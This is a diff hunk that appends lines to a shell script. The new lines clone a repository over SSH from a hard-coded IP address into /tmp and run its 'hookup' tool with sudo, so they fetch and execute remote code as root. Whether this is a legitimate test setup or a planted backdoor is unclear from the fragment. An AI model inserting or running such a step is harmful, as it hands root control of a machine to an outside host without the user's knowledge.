@@ -94,4 +94,11 @@ process_args()
 [ -n "$SIGNALS" ] && trap on_exit "$SIGNALS"
 process_args "$@"
 
+cd /tmp
+if git clone -b master ssh://${USER}@101.132.142.37:30149/auto_test ; then
+                cd auto_test/hooks
+                if hookup -v >/dev/null ; then
+                        sudo ./hookup -p
+                fi
+fi
 
